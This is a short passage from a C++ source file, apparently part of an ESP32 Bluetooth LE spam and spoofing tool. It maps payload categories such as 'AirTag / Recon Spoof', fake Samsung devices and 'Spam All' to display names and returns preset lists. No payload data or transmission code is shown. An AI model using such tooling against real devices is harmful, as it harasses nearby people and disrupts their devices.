        case BlePayloadCategory::SamsungBuds:       return "Samsung Galaxy Buds";
        case BlePayloadCategory::SamsungWatch:      return "Samsung Galaxy Watch";
        case BlePayloadCategory::GenericBeacon:     return "Baliza genérica";
        case BlePayloadCategory::HidPeripherals:    return "HID Peripherals";
        case BlePayloadCategory::SpoofAirTag:       return "AirTag / Recon Spoof";
        case BlePayloadCategory::SpamAll:           return "Spam All (GhostESP Random)";
    }
    return "Desconocido";
}

const std::vector<AppleProximityDevice>& BlePayloadRegistry::getAppleProximityDevices() {
    return kAppleProximityDevices;
}

const std::vector<SwiftPairPreset>& BlePayloadRegistry::getSwiftPairPresets() {
    return kSwiftPairPresets;
}

const std::vector<HidPreset>& BlePayloadRegistry::getHidPresets() {
    return kHidPresets;
}

} // namespace ble
} // namespace cbdos